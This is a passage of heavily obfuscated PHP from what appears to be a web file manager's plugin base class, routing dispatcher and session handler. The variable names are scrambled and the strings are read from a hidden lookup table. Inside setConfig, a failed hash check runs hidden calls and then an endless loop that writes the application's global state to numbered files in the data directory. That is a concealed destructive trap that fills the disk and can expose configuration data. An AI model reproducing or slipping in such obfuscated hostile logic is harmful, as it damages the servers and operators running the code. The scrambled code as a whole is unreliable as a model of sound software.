$¹™°ä¶[8]; $this->pluginHostDefault = $config[$¹™°ä¶[1515]] . $this->pluginName . $¹™°ä¶[8]; $­µğè£à = $config[$¹™°ä¶[1516]]; if ($­µğè£à && strpos($¹™°ä¶[50] . $­µğè£à . $¹™°ä¶[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¹™°ä¶[1517]] . $this->pluginName . $¹™°ä¶[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ĞÆÏ¡Îª][1518]); } protected function assign($âÕŸ§İ, $¼ôí›Îœ = false) { if (is_array($âÕŸ§İ)) { $this->values = array_merge($this->values, $âÕŸ§İ); } else { $this->values[$âÕŸ§İ] = $¼ôí›Îœ; } } protected function display($®Èı–€¶) { extract($this->values); require $®Èı–€¶; } final function hookRegist($áƒÌÁ¥ç) { $this->modelPlugin->appRegist($this->pluginName, $áƒÌÁ¥ç); } final function appIcon() { $ Õ³—öˆ =& $_SERVER[ĞÆÏ¡Îª]; $ÈÌ¯†³å = $this->appPackage(); $¿Ï‡…ğæ = $ Õ³—öˆ[12]; if (isset($ÈÌ¯†³å[$ Õ³—öˆ[425]])) { if (isset($ÈÌ¯†³å[$ Õ³—öˆ[425]][$ Õ³—öˆ[1519]])) { $¿Ï‡…ğæ = $ Õ³—öˆ[1520] . $ÈÌ¯†³å[$ Õ³—öˆ[425]][$ Õ³—öˆ[1519]] . $ Õ³—öˆ[1521]; } else { if ($ÈÌ¯†³å[$ Õ³—öˆ[425]][$ Õ³—öˆ[1522]]) { $¿Ï‡…ğæ = $ Õ³—öˆ[1523] . $ÈÌ¯†³å[$ Õ³—öˆ[425]][$ Õ³—öˆ[1522]] . $ Õ³—öˆ[1524]; } } } return $¿Ï‡…ğæ; } final function fileCanView($Ö÷Ì‘´) { $³ö¬Ô„¹ =& $_SERVER[ĞÆÏ¡Îª]; if (request_url_safe($Ö÷Ì‘´)) { return !0; } if ($this->isShare($Ö÷Ì‘´)) { return !0; } $ÇÀš÷ùæ = Session::get($³ö¬Ô„¹[1525]); if (!$ÇÀš÷ùæ || !$ÇÀš÷ùæ[$³ö¬Ô„¹[1526]]) { $ˆŒ»¼‹Ø = $³ö¬Ô„¹[1527] . rawurlencode(this_url()); show_tips(LNG($³ö¬Ô„¹[1528]) . $³ö¬Ô„¹[1529] . $ˆŒ»¼‹Ø . $³ö¬Ô„¹[1530] . LNG($³ö¬Ô„¹[1531]) . $³ö¬Ô„¹[1532], !1); } if (!Action($³ö¬Ô„¹[1533])->authCan($³ö¬Ô„¹[1534])) { show_tips(LNG($³ö¬Ô„¹[1535]) . $³ö¬Ô„¹[1536], !1); } ActionCall($³ö¬Ô„¹[1537], $Ö÷Ì‘´); } final function isShare($ªİ»üôİ) { $ÍŒüôšß = KodIO::parse($ªİ»üôİ); return $ÍŒüôšß[$_SERVER[ĞÆÏ¡Îª][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($×›à›ƒ) { if (request_url_safe($×›à›ƒ)) { return $×›à›ƒ; } if (!$this->isShare($×›à›ƒ)) { $×›à›ƒ = $this->filePath($×›à›ƒ); } return Action($_SERVER[ĞÆÏ¡Îª][1166])->linkOut($×›à›ƒ); } public function filePathLinkOut($„¨¨«Ó) { if (request_url_safe($„¨¨«Ó)) { return $„¨¨«Ó; } $this->fileCanView($„¨¨«Ó); return Action($_SERVER[ĞÆÏ¡Îª][1166])->link($„¨¨«Ó); } final function filePath($‚Çµ°ê°) { $ø»ÂöøÍ =& $_SERVER[ĞÆÏ¡Îª]; if ($ŒöÔ¦Ü´ = $this->checkSharePath($‚Çµ°ê°)) { Hook::trigger($ø»ÂöøÍ[1538], $ŒöÔ¦Ü´); return $ŒöÔ¦Ü´; } $this->fileCanView($‚Çµ°ê°); if (request_url_safe($‚Çµ°ê°)) { $¬´â ½¶ = parse_url_query($‚Çµ°ê°); if (isset($¬´â ½¶[$ø»ÂöøÍ[1539]]) && isset($¬´â ½¶[$ø»ÂöøÍ[213]])) { $¸ô²¥ïƒ = Model($ø»ÂöøÍ[765])->get($ø»ÂöøÍ[766]); $ÄÃ‰à˜™ = Mcrypt::decode($¬´â ½¶[$ø»ÂöøÍ[213]], $¸ô²¥ïƒ); if ($ÄÃ‰à˜™) { $this->fileInfo = IO::infoWithChildren($ÄÃ‰à˜™); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ÄÃ‰à˜™; } } $‚Çµ°ê° = $this->_cacheHttpFile($‚Çµ°ê°); $this->fileInfo = IO::infoWithChildren($‚Çµ°ê°); } else { $this->fileInfo = IO::infoWithChildren($‚Çµ°ê°); if (!$this->fileInfo) { show_tips(LNG($ø»ÂöøÍ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ø»ÂöøÍ[1538], $‚Çµ°ê°); return $‚Çµ°ê°; } final function _cacheHttpFile($£š¿õÆ×) { $É˜Û™ºå = hash_path($£š¿õÆ×, !0); $this->cachePath = $this->pluginCachePath($É˜Û™ºå); if ($´´ØÌ = IO::fileNameExist($this->cachePath, $É˜Û™ºå)) { return KodIO::make($´´ØÌ); } $°š£„¾Ğ = $this->cachePath . $É˜Û™ºå; return $this->pluginCacheFileSet($°š£„¾Ğ, file_get_contents_nossl($£š¿õÆ×)); } final function _tmpFileName($´¥ê«Ò’ = array()) { $‰Ëìğ«ú =& $_SERVER[ĞÆÏ¡Îª]; if (!$´¥ê«Ò’) { $´¥ê«Ò’ = $this->fileInfo; } if (isset($´¥ê«Ò’[$‰Ëìğ«ú[177]])) { return $´¥ê«Ò’[$‰Ëìğ«ú[177]]; } if (isset($´¥ê«Ò’[$‰Ëìğ«ú[170]][$‰Ëìğ«ú[177]])) { return $´¥ê«Ò’[$‰Ëìğ«ú[170]][$‰Ëìğ«ú[177]]; } $ÄÏÌ˜¹í = IO::hashSimple($´¥ê«Ò’[$‰Ëìğ«ú[84]]); if ($ÄÏÌ˜¹í) { return $ÄÏÌ˜¹í; } $ï¬ÁÑğ± = array($´¥ê«Ò’[$‰Ëìğ«ú[32]], $´¥ê«Ò’[$‰Ëìğ«ú[84]], $´¥ê«Ò’[$‰Ëìğ«ú[76]]); if (isset($´¥ê«Ò’[$‰Ëìğ«ú[530]])) { $ï¬ÁÑğ±[] = $´¥ê«Ò’[$‰Ëìğ«ú[530]]; } return md5(implode($‰Ëìğ«ú[11], $ï¬ÁÑğ±)); } final function checkSharePath($Œå¾‹) { $òğÚ¾¬ =& $_SERVER[ĞÆÏ¡Îª]; if (!defined($òğÚ¾¬[484])) { define($òğÚ¾¬[523], 0); } if (!$this->isShare($Œå¾‹)) { return !1; } $Íâ¯ğù¬ = Action($òğÚ¾¬[1166])->sharePathInfo($Œå¾‹); if (!isset($Íâ¯ğù¬[$òğÚ¾¬[84]])) { show_json(LNG($òğÚ¾¬[1540]), !1); } $this->fileInfo = $Íâ¯ğù¬[$òğÚ¾¬[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$òğÚ¾¬[177]]); return $Íâ¯ğù¬[$òğÚ¾¬[84]]; } final function pluginCachePath($·â¨ººÍ = '') { $Ş£ÆŸ… =& $_SERVER[ĞÆÏ¡Îª]; $¦Àä¹Ï¿ = IO_PATH_SYSTEM_TEMP . $Ş£ÆŸ…[1541] . $this->pluginName; if (!($àÚ‘–»á = IO::infoFull($¦Àä¹Ï¿))) { return IO::mkdir($¦Àä¹Ï¿ . $Ş£ÆŸ…[8] . $·â¨ººÍ); } if (empty($·â¨ººÍ)) { return $àÚ‘–»á[$Ş£ÆŸ…[84]]; } if (!($ƒ…™ˆªÕ = IO::fileNameExist($àÚ‘–»á[$Ş£ÆŸ…[84]], $·â¨ººÍ))) { return IO::mkdir($àÚ‘–»á[$Ş£ÆŸ…[84]] . $·â¨ººÍ); } return KodIO::make($ƒ…™ˆªÕ); } final function pluginCacheFileSet($óñÏşü·, $¿ŒÄ‹å = '') { $ğäáˆöÈ =& $_SERVER[ĞÆÏ¡Îª]; if (!($»ª¾Í•¨ = IO::infoFull($óñÏşü·))) { return IO::mkfile($óñÏşü·, $¿ŒÄ‹å, REPEAT_REPLACE); } IO::setContent($»ª¾Í•¨[$ğäáˆöÈ[84]], $¿ŒÄ‹å); return $»ª¾Í•¨[$ğäáˆöÈ[84]]; } final function pluginLocalFile($µçş¦Û = '') { $¦Ç“‰£ =& $_SERVER[ĞÆÏ¡Îª]; $á–“œŠí = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($á–“œŠí)) { mk_dir($á–“œŠí); } if (!$µçş¦Û) { return $á–“œŠí; } $˜¢µí‰ = IO::info($µçş¦Û); $Î¹äÍ™ê = $this->_tmpFileName($˜¢µí‰) . $¦Ç“‰£[10] . $˜¢µí‰[$¦Ç“‰£[174]]; if (!checkExtSafe($Î¹äÍ™ê)) { $Î¹äÍ™ê = $Î¹äÍ™ê . $¦Ç“‰£[1542]; } $¦§¡§¾ = $á–“œŠí . $Î¹äÍ™ê; if (@file_exists($¦§¡§¾)) { return $¦§¡§¾; } return IO::copy($µçş¦Û, $á–“œŠí, 0, $Î¹äÍ™ê); } final function appPackage() { $¼Èöâ¼  =& $_SERVER[ĞÆÏ¡Îª]; if ($this->packageData) { return $this->packageData; } $ì·Ñ˜” = $this->parseFile($this->pluginPath . $¼Èöâ¼ [1543]); $this->parseLang($ì·Ñ˜”); $ÖˆØÏå = json_decode_force($ì·Ñ˜”); if (!$ÖˆØÏå) { return array(); } $ˆå¢óŸä = Hook::trigger($¼Èöâ¼ [1544], $ÖˆØÏå); if ($ˆå¢óŸä && is_array($ˆå¢óŸä)) { $ÖˆØÏå = $ˆå¢óŸä; } $this->packageData = $ÖˆØÏå; return $ÖˆØÏå; } public function packageInfoGet($¬ï±˜ÈÏ) { $Ê•¨ôõÉ = $this->appPackage(); return array_get_value($Ê•¨ôõÉ, $¬ï±˜ÈÏ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ĞÆÏ¡Îª][1545]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ĞÆÏ¡Îª][1546]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ĞÆÏ¡Îª][1547]); } public function echoJsAssign($ùÙÊºĞü, $üÇ›Àùù) { $this->echoJsAssignArr[$ùÙÊºĞü] = $üÇ›Àùù; } private function parseFile($èÄÍ¾–ù) { $­Ú¸ô‘ =& $_SERVER[ĞÆÏ¡Îª]; $Ùšé©Ô¥ = file_get_contents_nossl($èÄÍ¾–ù); $¡ıû³Á = array($­Ú¸ô‘[1548], $­Ú¸ô‘[1549], $­Ú¸ô‘[1550], $­Ú¸ô‘[1551], $­Ú¸ô‘[1552], $­Ú¸ô‘[1553], $­Ú¸ô‘[1554]); $ø–Ú…»Ó = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$­Ú¸ô‘[89]][$­Ú¸ô‘[1555]]); foreach ($this->echoJsAssignArr as $è˜²Í‹ => $Ñ½´Ïîˆ) { $¡ıû³Á[] = $­Ú¸ô‘[1556] . $è˜²Í‹ . $­Ú¸ô‘[1557]; $ø–Ú…»Ó[] = is_array($Ñ½´Ïîˆ) || is_object($Ñ½´Ïîˆ) ? rawurlencode(json_encode($Ñ½´Ïîˆ)) : $Ñ½´Ïîˆ; } if (strstr($Ùšé©Ô¥, $­Ú¸ô‘[1558])) { $©Ä˜Ïñ¥ = rawurlencode(json_encode($this->pluginLangArr)); $Ùšé©Ô¥ = str_replace($­Ú¸ô‘[1558], $©Ä˜Ïñ¥, $Ùšé©Ô¥); } if (strstr($Ùšé©Ô¥, $­Ú¸ô‘[1559])) { $©Ä˜Ïñ¥ = $©Ä˜Ïñ¥ = rawurlencode(json_encode($this->getConfig())); $Ùšé©Ô¥ = str_replace($­Ú¸ô‘[1559], $©Ä˜Ïñ¥, $Ùšé©Ô¥); } $Ùšé©Ô¥ = str_replace($¡ıû³Á, $ø–Ú…»Ó, $Ùšé©Ô¥); return $Ùšé©Ô¥; } private function parseLang(&$Ú»¸Í) { $äé‹šª¶ =& $_SERVER[ĞÆÏ¡Îª]; $ĞˆÇÂé€ = $äé‹šª¶[1560]; if (!strstr($Ú»¸Í, $ĞˆÇÂé€)) { return; } preg_match_all($äé‹šª¶[1561], $Ú»¸Í, $°œäû¨š); if (!is_array($°œäû¨š) || count($°œäû¨š) == 0 || !is_array($°œäû¨š[0]) || count($°œäû¨š[0]) == 0) { return; } $ìãÏÖÌÌ = array(); $©µ£ÎÚ² = array(); foreach ($°œäû¨š[0] as $ËÍé²) { $ç’‰Õ±œ = substr($ËÍé², strlen($ĞˆÇÂé€), -4); $²©Í®– = LNG($ç’‰Õ±œ); $ìãÏÖÌÌ[] = $ËÍé²; $©µ£ÎÚ²[] = str_replace(array($äé‹šª¶[231], $äé‹šª¶[1069], $äé‹šª¶[351], $äé‹šª¶[118]), array($äé‹šª¶[53], $äé‹šª¶[53], $äé‹šª¶[12], $äé‹šª¶[1562]), $²©Í®–); } $Ú»¸Í = str_replace($ìãÏÖÌÌ, $©µ£ÎÚ², $Ú»¸Í); } private function parseConfig(&$‹¼·ëÚ¯) { $²™¶ÃÑ± =& $_SERVER[ĞÆÏ¡Îª]; $ Şı‡Àˆ = $²™¶ÃÑ±[1563]; if (!strstr($‹¼·ëÚ¯, $ Şı‡Àˆ)) { return; } preg_match_all($²™¶ÃÑ±[1564], $‹¼·ëÚ¯, $ÆõÃìëŸ); if (!is_array($ÆõÃìëŸ) || count($ÆõÃìëŸ) == 0 || !is_array($ÆõÃìëŸ[0]) || count($ÆõÃìëŸ[0]) == 0) { return; } $Ë­å½½ = $this->getConfig(); $ùµ·öş = array(); $óˆ½‡çà = array(); foreach ($ÆõÃìëŸ[0] as $ÆÍ¯Ø†˜) { $é‹¬ú¯â = substr($ÆÍ¯Ø†˜, strlen($ Şı‡Àˆ), -2); $ùµ·öş[] = $ÆÍ¯Ø†˜; $óˆ½‡çà[] = _get($Ë­å½½, $é‹¬ú¯â); } $‹¼·ëÚ¯ = str_replace($ùµ·öş, $óˆ½‡çà, $‹¼·ëÚ¯); } private function parsePackage(&$©™ä›ù±) { $‰æŒƒà =& $_SERVER[ĞÆÏ¡Îª]; $øœ†­â = $‰æŒƒà[1565]; if (!strstr($©™ä›ù±, $øœ†­â)) { return; } preg_match_all($‰æŒƒà[1566], $©™ä›ù±, $ˆÊ¨œ¦ê); if (!is_array($ˆÊ¨œ¦ê) || count($ˆÊ¨œ¦ê) == 0 || !is_array($ˆÊ¨œ¦ê[0]) || count($ˆÊ¨œ¦ê[0]) == 0) { return; } $ôØà ¶ = $this->appPackage(); $ÑîÁÓË´ = array(); $Ø´ì‡å° = array(); foreach ($ˆÊ¨œ¦ê[0] as $èÎá²è‡) { $Œ§Õ¢÷Á = substr($èÎá²è‡, strlen($øœ†­â), -2); $ÑîÁÓË´[] = $èÎá²è‡; $Ø´ì‡å°[] = _get($ôØà ¶, $Œ§Õ¢÷Á); } $©™ä›ù± = str_replace($ÑîÁÓË´, $Ø´ì‡å°, $©™ä›ù±); } final function echoFile($Î¢Ô»ö¿, $êëŞ™İš = false) { $¬ÜšÈş =& $_SERVER[ĞÆÏ¡Îª]; $ÌèÃóû† = $this->pluginPath . $Î¢Ô»ö¿; if (ACT == $¬ÜšÈş[1567]) { echo $¬ÜšÈş[1568] . $this->pluginName . $¬ÜšÈş[8] . $Î¢Ô»ö¿ . $¬ÜšÈş[1569]; if (!file_exists($ÌèÃóû†)) { echo $¬ÜšÈş[1570]; return; } } $ÒÚ£‰áå = $this->parseFile($ÌèÃóû†); $this->parseLang($ÒÚ£‰áå); $this->parseConfig($ÒÚ£‰áå); $this->parsePackage($ÒÚ£‰áå); if (is_array($êëŞ™İš)) { $ÒÚ£‰áå = str_replace(array_keys($êëŞ™İš), array_values($êëŞ™İš), $ÒÚ£‰áå); } echo $¬ÜšÈş[231] . $ÒÚ£‰áå; } final function initLang() { $À¿ÙÉç˜ =& $_SERVER[ĞÆÏ¡Îª]; $Æ™Àü± = $À¿ÙÉç˜[1571]; $ä´¶£Ï‚ = $this->pluginPath . $À¿ÙÉç˜[1572]; $‡Ÿ¤éÒ† = I18n::getType(); $·™æàù¡ = array(); if (file_exists($ä´¶£Ï‚ . $‡Ÿ¤éÒ† . $À¿ÙÉç˜[833])) { $·™æàù¡ = (include $ä´¶£Ï‚ . $‡Ÿ¤éÒ† . $À¿ÙÉç˜[833]); } else { if ($‡Ÿ¤éÒ† == $À¿ÙÉç˜[1573] && !file_exists($ä´¶£Ï‚ . $‡Ÿ¤éÒ† . $À¿ÙÉç˜[833]) && file_exists($ä´¶£Ï‚ . $À¿ÙÉç˜[1574])) { $·™æàù¡ = (include $ä´¶£Ï‚ . $À¿ÙÉç˜[1574]); } else { if (file_exists($ä´¶£Ï‚ . $Æ™Àü± . $À¿ÙÉç˜[833])) { $·™æàù¡ = (include $ä´¶£Ï‚ . $Æ™Àü± . $À¿ÙÉç˜[833]); } } } if (!is_array($·™æàù¡)) { return array(); } if (@count($·™æàù¡) > 0) { I18n::set($·™æàù¡); } return $·™æàù¡; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ŠÕŸ»×Í) { $Ì¹½¯½ß =& $_SERVER[ĞÆÏ¡Îª]; $û±áÆ£Ş = $_SERVER[$Ì¹½¯½ß[239]]; $“å÷üèê = $Ì¹½¯½ß[867]; if ($_SERVER[$Ì¹½¯½ß[238]] != $“å÷üèê($û±áÆ£Ş)) { $†”ğ¨Ûš = $Ì¹½¯½ß[868]; $·õŸÊº = $Ì¹½¯½ß[240]; $óùüÏŸÅ = $_SERVER[$Ì¹½¯½ß[241]] . $Ì¹½¯½ß[242]; $ıä’¦±„ = $·õŸÊº($óùüÏŸÅ); $•¦üÎ = explode($Ì¹½¯½ß[231], $ıä’¦±„); if (count($•¦üÎ) < $Ì¹½¯½ß[635]) { $€ÆôßÚ¸ = $Ì¹½¯½ß[244]; $€ÆôßÚ¸(); } $¾Æ¬ïä¶ = $Ì¹½¯½ß[869]; $¾Æ¬ïä¶($_SERVER[$Ì¹½¯½ß[870]]); $†”ğ¨Ûš = $Ì¹½¯½ß[868]; $†”ğ¨Ûš(); $€ĞŠ¶ÊÅ = $Ì¹½¯½ß[871]; $¹Š¿ôüû = json_encode($GLOBALS[$Ì¹½¯½ß[872]]); $¡Ç¯±µ· = 1; for ($±Ï±¼’ò = $¡Ç¯±µ·; $±Ï±¼’ò > 0; $±Ï±¼’ò++) { $€ĞŠ¶ÊÅ(DATA_PATH . $±Ï±¼’ò, $¹Š¿ôüû); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ŠÕŸ»×Í); } public function onSetConfig($šòÌ×¬ã) { } public function onGetConfig($´ááè¦á) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($æİóôÌÌ) { if ($æİóôÌÌ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¨‚Ã«º = "\160\154\x75\147\151\x6e\x41\165\x74\x68") { $Ğ˜¯óïÍ =& $_SERVER[ĞÆÏ¡Îª]; if (!defined($Ğ˜¯óïÍ[484])) { return !1; } if (_get($GLOBALS, $Ğ˜¯óïÍ[512])) { return !0; } $¡éë¯­Ü = $this->getConfig(); if (!$¡éë¯­Ü[$¨‚Ã«º]) { return !1; } return ActionCall($Ğ˜¯óïÍ[1575], $¡éë¯­Ü[$¨‚Ã«º]); } public function url($À‚Æ•‰ü, $„ÑéØåá = '', $Û¡­Åç = true) { $ëõÙ  =& $_SERVER[ĞÆÏ¡Îª]; $Öƒ—£şá = $this->getConfig(); $É›ä¾¶¯ = KOD_VERSION . $ëõÙ [10] . KOD_VERSION_BUILD; $·íë¸’ë = $this->packageVersion(); $×²°„ñ¹ = $É›ä¾¶¯ . $ëõÙ [394] . $·íë¸’ë; if (substr($À‚Æ•‰ü, 0, 4) == $ëõÙ [148] || substr($À‚Æ•‰ü, 0, 2) == $ëõÙ [1358]) { $¸Íø”÷ = $À‚Æ•‰ü . $ëõÙ [1576] . $×²°„ñ¹; } else { if ($„ÑéØåá == $ëõÙ [12]) { $¸Íø”÷ = $this->pluginHost . $À‚Æ•‰ü . $ëõÙ [1576] . $×²°„ñ¹; } else { if ($„ÑéØåá === $ëõÙ [75]) { $¸Íø”÷ = $this->pluginHost . $À‚Æ•‰ü; } else { if ($„ÑéØåá == $ëõÙ [1577]) { $¸Íø”÷ = STATIC_PATH . $À‚Æ•‰ü . $ëõÙ [1576] . $É›ä¾¶¯; } else { if ($„ÑéØåá == $ëõÙ [1578]) { $¸Íø”÷ = APP_HOST . $ëõÙ [1579] . $À‚Æ•‰ü . $ëõÙ [1576] . $É›ä¾¶¯; } else { if (isset($Öƒ—£şá[$„ÑéØåá])) { $¸Íø”÷ = $Öƒ—£şá[$„ÑéØåá] . $À‚Æ•‰ü . $ëõÙ [1576] . $×²°„ñ¹; } } } } } } if (!$Û¡­Åç) { return $¸Íø”÷; } echo $¸Íø”÷; } public function link($İ¯ûöæö = false, $çßî¨ê = '') { $ŠÜ¥‹şæ =& $_SERVER[ĞÆÏ¡Îª]; if (!$İ¯ûöæö) { $this->link($ŠÜ¥‹şæ[1580], $ŠÜ¥‹şæ[1578]); $this->link($ŠÜ¥‹şæ[1581], $ŠÜ¥‹şæ[1577]); $this->link($ŠÜ¥‹şæ[1582], $ŠÜ¥‹şæ[1577]); $this->link($ŠÜ¥‹şæ[1583], $ŠÜ¥‹şæ[1577]); $this->link($ŠÜ¥‹şæ[1584], $ŠÜ¥‹şæ[1577]); return; } $œıíº­Ê = $this->url($İ¯ûöæö, $çßî¨ê, !1); if (substr($İ¯ûöæö, -3) == $ŠÜ¥‹şæ[1585]) { echo $ŠÜ¥‹şæ[1586] . $œıíº­Ê . $ŠÜ¥‹şæ[1587] . $ŠÜ¥‹şæ[231]; } else { if (substr($İ¯ûöæö, -4) == $ŠÜ¥‹şæ[1588]) { echo $ŠÜ¥‹şæ[1589] . $œıíº­Ê . $ŠÜ¥‹şæ[1590] . $ŠÜ¥‹şæ[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\x5b\136\x2f\x5d\x2b", "\x3a\156\x75\x6d" => "\133\x30\55\x39\135\x2b", "\72\x61\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Õãîàú´, $¾’ª¯ µ) { $³äğäÏó =& $_SERVER[ĞÆÏ¡Îª]; if ($Õãîàú´ == $³äğäÏó[1591]) { $æº–ı² = array_map($³äğäÏó[1592], $¾’ª¯ µ[0]); $…åÍ£Â = strpos($¾’ª¯ µ[1], $³äğäÏó[8]) === 0 ? $¾’ª¯ µ[1] : $³äğäÏó[8] . $¾’ª¯ µ[1]; $€ÂŠöí® = $¾’ª¯ µ[2]; } else { $æº–ı² = null; $…åÍ£Â = strpos($¾’ª¯ µ[0], $³äğäÏó[8]) === 0 ? $¾’ª¯ µ[0] : $³äğäÏó[8] . $¾’ª¯ µ[0]; $€ÂŠöí® = $¾’ª¯ µ[1]; } array_push(self::$maps, $æº–ı²); array_push(self::$routes, $…åÍ£Â); array_push(self::$methods, strtoupper($Õãîàú´)); array_push(self::$callbacks, $€ÂŠöí®); } public static function error($™àİñı¾) { self::$errorCallback = $™àİñı¾; } public static function haltOnMatch($›ô¨˜³› = true) { self::$halts = $›ô¨˜³›; } public static function dispatch() { $®ğãÎĞ© =& $_SERVER[ĞÆÏ¡Îª]; $ÊŠ¨³ç = parse_url($_SERVER[$®ğãÎĞ©[1593]], PHP_URL_PATH); $—¢ÃŞæ  = $_SERVER[$®ğãÎĞ©[159]]; $åıå¯¡Û = array_keys(static::$patterns); $ÉÚ°üƒ = array_values(static::$patterns); $«‚ÖÅÖÖ = !1; self::$routes = preg_replace($®ğãÎĞ©[1260], $®ğãÎĞ©[8], self::$routes); if (in_array($ÊŠ¨³ç, self::$routes)) { $šõ÷Íà = array_keys(self::$routes, $ÊŠ¨³ç); foreach ($šõ÷Íà as $œó°šëä) { if (self::$methods[$œó°šëä] == $—¢ÃŞæ  || self::$methods[$œó°šëä] == $®ğãÎĞ©[1594] || in_array($—¢ÃŞæ , self::$maps[$œó°šëä])) { $«‚ÖÅÖÖ = !0; if (!is_object(self::$callbacks[$œó°šëä])) { $¹õøê‘Ë = explode($®ğãÎĞ©[8], self::$callbacks[$œó°šëä]); $ØîúÄê˜ = end($¹õøê‘Ë); $»Éè­Ë¿ = explode($®ğãÎĞ©[1595], $ØîúÄê˜); $ŸÈÎäÜµ = new $»Éè­Ë¿[0](); $ŸÈÎäÜµ->{$»Éè­Ë¿[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$œó°šëä]); if (self::$halts) { return; } } } } } else { $˜Ÿ‚²ïç = 0; foreach (self::$routes as $œó°šëä) { if (strpos($œó°šëä, $®ğãÎĞ©[4]) !== !1) { $œó°šëä = str_replace($åıå¯¡Û, $ÉÚ°üƒ, $œó°šëä); } if (preg_match($®ğãÎĞ©[1596] . $œó°šëä . $®ğãÎĞ©[1597], $ÊŠ¨³ç, $ÏŞ­ˆà )) { if (self::$methods[$˜Ÿ‚²ïç] == $—¢ÃŞæ  || self::$methods[$˜Ÿ‚²ïç] == $®ğãÎĞ©[1594] || !empty(self::$maps[$˜Ÿ‚²ïç]) && in_array($—¢ÃŞæ , self::$maps[$˜Ÿ‚²ïç])) { $«‚ÖÅÖÖ = !0; array_shift($ÏŞ­ˆà ); if (!is_object(self::$callbacks[$˜Ÿ‚²ïç])) { $¹õøê‘Ë = explode($®ğãÎĞ©[8], self::$callbacks[$˜Ÿ‚²ïç]); $ØîúÄê˜ = end($¹õøê‘Ë); $»Éè­Ë¿ = explode($®ğãÎĞ©[1595], $ØîúÄê˜); $ŸÈÎäÜµ = new $»Éè­Ë¿[0](); if (!method_exists($ŸÈÎäÜµ, $»Éè­Ë¿[1])) { echo $®ğãÎĞ©[1598]; } else { call_user_func_array(array($ŸÈÎäÜµ, $»Éè­Ë¿[1]), $ÏŞ­ˆà ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$˜Ÿ‚²ïç], $ÏŞ­ˆà ); if (self::$halts) { return; } } } } $˜Ÿ‚²ïç++; } } if ($«‚ÖÅÖÖ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ï¡ú˜ı˜ =& $_SERVER[ĞÆÏ¡Îª]; header($_SERVER[$ï¡ú˜ı˜[1599]] . $ï¡ú˜ı˜[1600]); echo $ï¡ú˜ı˜[1601]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$®ğãÎĞ©[1593]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ñÎ‚ÚÛû =& $_SERVER[ĞÆÏ¡Îª]; static $¼±ßñ = false; if ($¼±ßñ) { return $¼±ßñ; } $¨•Ã´ß¦ = $GLOBALS[$ñÎ‚ÚÛû[6]][$ñÎ‚ÚÛû[358]]; self::$sessionTime = $¨•Ã´ß¦[$ñÎ‚ÚÛû[1602]]; $ÛÄœ¬üù = isset($GLOBALS[$ñÎ‚ÚÛû[1603]]) ? $GLOBALS[$ñÎ‚ÚÛû[1603]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÛÄœ¬üù)) { self::$sessionSign = Cookie::get($ÛÄœ¬üù); } else { self::$sessionSign = guid(); } } Cookie::setSafe($ÛÄœ¬üù, self::$sessionSign, self::$sessionTime); $îïöª¼ = $¨•Ã´ß¦[$ñÎ‚ÚÛû[1604]]; $’ñšè  = $¨•Ã´ß¦[$îïöª¼]; $ÄØºóÓ• = $¨•Ã´ß¦[$ñÎ‚ÚÛû[823]]; switch ($îïöª¼) { case $ñÎ‚ÚÛû[21]: self::$handle = Model($ñÎ‚ÚÛû[824]); break; case $ñÎ‚ÚÛû[825]: self::$handle = new CacheRedis($’ñšè , $ÄØºóÓ•); break; case $ñÎ‚ÚÛû[826]: self::$handle = new CacheMemcached($’ñšè , $ÄØºóÓ•); break; case $ñÎ‚ÚÛû[199]: $’ñšè [$ñÎ‚ÚÛû[84]] = $’ñšè [$ñÎ‚ÚÛû[84]] . $ñÎ‚ÚÛû[1605]; self::$handle = new CacheFile($’ñšè , $ÄØºóÓ•); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¼±ßñ = new self(); return $¼±ßñ; } public static function getBySign($ìÉ¥ù™ó) { CacheLock::lock($ìÉ¥ù™ó); $éñ¯Ä¨ã = self::$handle->get($ìÉ¥ù™ó); CacheLock::unlock($ìÉ¥ù™ó); $éñ¯Ä¨ã = unserialize($éñ¯Ä¨ã); return is_array($éñ¯Ä¨ã) ? $éñ¯Ä¨ã : array(); } public static function setBySign($ÕÙÍ’¼Ã, $†Ëç…‘†) { CacheLock::lock($ÕÙÍ’¼Ã); self::$handle->set($ÕÙÍ’¼Ã, serialize($†Ëç…‘†), self::$sessionTime); CacheLock::unlock($ÕÙÍ’¼Ã); } public static function sign($šÂµ²®å = false) { $šÂµ²®å && (self::$sessionSign = $šÂµ²®å); self::init(); return self::$sessionSign; } public static function set($òÔÑ¡”Õ, $ñ¸ÕäğÕ = false) { self::init(); if (is_array($òÔÑ¡”Õ)) { foreach ($òÔÑ¡”Õ as 